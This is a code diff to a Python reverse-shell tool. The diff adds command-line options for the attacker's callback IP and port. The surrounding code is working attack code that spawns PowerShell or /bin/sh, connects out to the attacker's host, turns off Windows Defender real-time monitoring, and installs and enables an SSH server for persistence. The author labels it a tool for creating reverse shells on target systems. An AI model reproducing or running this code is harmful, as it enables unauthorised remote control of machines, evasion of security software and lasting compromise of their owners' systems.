@@ -6,20 +6,46 @@ import psutil
 import struct
 import platform
 import socket
+import argparse
+
+author = "Gokul B"
+
+
+parser = argparse.ArgumentParser(description="A Python script for creating a reverse shell on target systems, supporting Windows and Linux platforms. Use responsibly and with proper authorization.")
+
+parser.add_argument(
+    "-ip",
+    nargs=1,
+    help="Ip to connect with target"
+)
+parser.add_argument(
+    '-port',
+    nargs=1,
+    help="Specify the port to connect"
+)
+
+args = parser.parse_args()
+
+if args.ip and args.port:
+    ip = args.ip[0]
+    port = int(args.port[0])
+else:
+    print("Both IP and port arguments are required.")
+    sys.exit(1)
 
 
 class Details:
-    def __init__(self):
+    def __init__(self, ip, port):
         self.os = os.name
-        self.ip = "127.0.0.1"
-        self.port = 9191
+        self.ip = ip
+        self.port = port
 
-    
+
     ## FOR WINDOWS
     def windows(self):
         """Function is only work if the host has a Windows Operating system It will create a Reverse Shell"""
 
-        
+
         os.system("pip install psutil")
         ps_process = subprocess.Popen(["powershell", "-NoProfile", "-NoExit", "-Command", "-"],
                                       stdin=subprocess.PIPE,
@@ -33,7 +59,7 @@ class Details:
             "Start-Service sshd",
             "Set-Service -Name sshd -StartupType 'Automatic'",####SSH END
             "Set-MpPreference -DisableRealtimeMonitoring $true",  ##Disabling the Windows Defender
-            "$ip = '127.0.0.1'",  ###########CHANGE THE IP 
+            "$ip = '127.0.0.1'",  ###########CHANGE THE IP
             "$port = 9191",         #############CHANGE THE PORT
             "$tcpClient = New-Object System.Net.Sockets.TcpClient",
             "$tcpClient.Connect($ip, $port)",
@@ -70,8 +96,8 @@ class Details:
         gateway = self.get_default_gateway()
         s.send(gateway.encode())
         subprocess.call(["/bin/sh","-i"])
-        
-    
+
+
     def get_default_gateway(self):  #### Gateway
         """This function will identify the Default Gateway of the Device """
         if platform.system() == "Windows":
@@ -101,8 +127,7 @@ class Details:
 
     def print_details(self):
         print(f"Operating system: {self.os}")
-        print(f"Build Number: {self.build_no}")
 
-details = Details()
+details = Details(ip, port)
 details.os_define()
 details.print_details()
